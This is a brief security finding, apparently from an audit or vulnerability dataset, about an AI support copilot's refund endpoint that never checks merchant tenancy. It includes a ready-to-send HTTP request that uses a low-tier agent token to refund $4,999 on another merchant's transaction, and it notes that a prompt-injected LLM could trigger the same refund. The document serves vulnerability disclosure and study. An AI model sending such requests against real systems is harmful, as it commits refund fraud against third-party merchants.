diagnosis: The AI customer support copilot endpoint executes refund operations based on tool arguments returned by the LLM. It fails to verify that the transactionId belongs to the store or merchant tenancy managed by the support agent. A compromised agent account or prompt-injected LLM can trigger unauthorized financial refunds against transactions belonging to arbitrary third-party merchants.
exploit_request:
POST /api/copilot/tools/issue-refund HTTP/1.1
Host: copilot.storehub.net:8112
Authorization: Bearer <low_tier_store_agent_jwt>
Content-Type: application/json

{"toolArgs": {"transactionId": "txn_rival_merchant_luxury_goods_4412", "refundAmountDollars": 4999.00, "reason": "AI Copilot authorized refund"}}
